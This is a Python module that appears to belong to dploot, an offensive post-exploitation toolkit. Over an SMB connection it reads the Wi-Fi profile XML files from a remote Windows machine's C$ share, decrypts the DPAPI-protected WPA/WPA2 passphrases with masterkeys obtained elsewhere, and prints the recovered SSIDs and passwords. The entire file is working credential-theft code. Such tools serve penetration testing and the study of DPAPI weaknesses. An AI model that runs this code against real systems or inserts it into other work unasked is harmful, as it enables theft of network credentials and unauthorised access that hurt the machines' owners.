from binascii import unhexlify
import logging
import ntpath
from typing import List
from xml.dom import minidom

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.triage.masterkeys import Masterkey

class WifiCred:
    def __init__(self, ssid: str, auth: str, username: str = 'N/A', password: str = 'N/A') -> None:
        self.ssid = ssid
        self.auth = auth
        self.username = username
        self.password = password

    def dump(self) -> None:
        print('[WIFI]')
        print('SSID:\t\t%s' % self.ssid)
        print('AuthType:\t%s' % self.auth.upper())
        print('Username:\t%s' % self.username)
        print('Password:\t%s' % self.password)
        print()

    def dump_quiet(self) -> None:
        if self.auth.upper() == 'OPEN':
            print("[WIFI] %s - OPEN" % (self.ssid))
        elif self.auth.upper() in ['WPAPSK', 'WPA2PSK']:
            print("[WIFI] %s - %s - Passphrase: %s" % (self.ssid, self.auth.upper(), self.password))

class WifiTriage:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']

    system_wifi_generic_path = "ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces"
    share = 'C$'

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey]) -> None:
        self.target = target
        self.conn = conn
        
        self.looted_files = dict()
        self.masterkeys = masterkeys

    def triage_wifi(self) -> List[WifiCred]:
        wifi_creds = list()
        try:
            wifi_dir = self.conn.remote_list_dir(self.share, self.system_wifi_generic_path)
            if wifi_dir is not None:
                for dir in wifi_dir:
                    if dir.is_directory() > 0 and dir.get_longname() not in self.false_positive:
                        wifi_interface_path = ntpath.join(self.system_wifi_generic_path,dir.get_longname())
                        wifi_interface_dir = self.conn.remote_list_dir(self.share, wifi_interface_path)
                        for file in wifi_interface_dir:
                            filename = file.get_longname()
                            if file.is_directory() == 0 and filename not in self.false_positive and filename[-4:] == '.xml':
                                wifi_interface_filepath = ntpath.join(wifi_interface_path, filename)
                                logging.info("Found Wifi connection file: \\\\%s\\%s\\%s" %  (self.target.address,self.share,wifi_interface_filepath))
                                wifi_interface_data = self.conn.readFile(self.share, wifi_interface_filepath)
                                self.looted_files[filename] = wifi_interface_data
                                xml_data = minidom.parseString(wifi_interface_data)
                                ssid = xml_data.getElementsByTagName('SSID')[0].getElementsByTagName('name')[0].childNodes[0].data
                                auth_type = xml_data.getElementsByTagName('authentication')[0].childNodes[0].data

                                dpapi_blob = None
                                if auth_type == 'WPA2PSK' or auth_type == 'WPAPSK':
                                    dpapi_blob = xml_data.getElementsByTagName('keyMaterial')[0].childNodes[0].data
                                elif auth_type == 'open':
                                    continue
                                else:
                                    logging.debug('Unsupported authentication type: %s. Please open issue to improve the project!' % auth_type)
                                masterkey = find_masterkey_for_blob(unhexlify(dpapi_blob), masterkeys=self.masterkeys)
                                password = ''
                                if masterkey is not None:
                                    password = decrypt_blob(unhexlify(dpapi_blob), masterkey=masterkey)
                                wifi_creds.append(WifiCred(ssid, auth_type, password=password))
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
                logging.debug(str(e))
            pass
        return wifi_creds